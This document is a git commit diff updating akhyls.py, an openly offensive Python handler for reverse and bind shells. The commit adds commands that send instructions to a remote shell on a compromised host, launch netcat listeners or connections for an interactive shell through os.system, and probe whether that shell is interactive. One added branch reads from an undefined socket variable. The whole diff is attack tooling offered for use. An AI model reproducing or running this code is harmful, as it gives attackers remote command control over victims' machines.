fca96f7881d1fa449be4e5c7ae71a3cda56a1410
İbrahim <38662689+Andhrimnirr@users.noreply.github.com>
2018-08-23 22:21:54 +0300

    Update akhyls.py

--- akhyls.py
+++ akhyls.py
@@ -1,5 +1,7 @@
 import sys
 import socket
+import os
+import time
 
 print("""
 ██████╗ ██████╗ ██╗   ██╗     ██╗   ██╗███████╗████████╗
@@ -13,7 +15,7 @@ Reverse shell >> Usage ./akhyls.py -R <PORT>
 Bind shell >> Usage ./akhyls.py -B <Ip> <PORT>
 Author:ibrahim @via Gizem Bulut
 """)
-tty='[ -z "$PS1" ] && echo "[+] Interactive" || echo "[-] Not interactive" '
+tty=""" bash -c '[[ $- == *i* ]] && echo "[+] Interactive" || echo "[+] Not interactive"' """
 def reverse(port):
     try:
         reverseshell=socket.socket()
@@ -24,6 +26,7 @@ def reverse(port):
         print("[+] SUCCESSFUL CONNECTION")
         print(a.recv(1024).decode('utf-8'))
         print('[!] Interactive shell to check >> use command shell_check')
+        print('[!] Interactive shell to switch >> use command interactive_shell')
         a.settimeout(3)
         host=str.encode('id -u -n')
         a.send(host)
@@ -43,6 +46,16 @@ def reverse(port):
                 elif command == "\n" or command == "":
                     print("[E] No command entered")
                     continue
+
+                elif command == "interactive_shell":
+                    print("[!] Switching to the interactive shell.Please enter the port number")
+                    port2=input("Port: ")
+                    if len(port2) > 0:
+                        a.send(str.encode("interactive_shell"+port2))
+                        os.system("x-terminal-emulator -e nc -lvp {}".format(port2))
+                        port2=0
+                    else:
+                        print("[!] Please enter the port number")
                 else:
                     a.send(str.encode(command))
                     while True:
@@ -67,6 +80,8 @@ def bind(ip,port) :
         bindshell.connect(((ip,int(port))))
         bindshell.settimeout(2)
         print(bindshell.recv(1024).decode('utf-8'))
+        print('[!] Interactive shell to check >> use command shell_check')
+        print('[!] Interactive shell to switch >> use command interactive_shell')
         host=str.encode('id -u -n')
         bindshell.send(host)
         hostname=bindshell.recv(1024).decode('utf-8')
@@ -83,7 +98,21 @@ def bind(ip,port) :
                 elif command == "\n" or command == "":
                     print("[E] No command entered")
                     continue
-
+                elif "shell_check".lower() in command:
+                    print('[*] Interactıve shell checked...')
+                    bindshell.send(str.encode(tty+'\n'))
+                    print(a.recv(1024).decode('utf-8'))
+                    
+                elif command == "interactive_shell":
+                    print("[!] Switching to the interactive shell.Please enter the port number")
+                    port2=input("Port: ")
+                    if len(port2) > 0:
+                        bindshell.send(str.encode("interactive_shell"+port2))
+                        time.sleep(3)
+                        os.system("x-terminal-emulator -e nc -vvn {} {}".format(ip,port2))
+                        port2=0
+                    else:
+                        print("[!] Please enter the port number")
                 else:
                     bindshell.send(str.encode(command))
                     while True:
@@ -115,4 +144,3 @@ if __name__=='__main__':
     elif("-R" in sys.argv[1]):
         reverse(sys.argv[2])
     
-
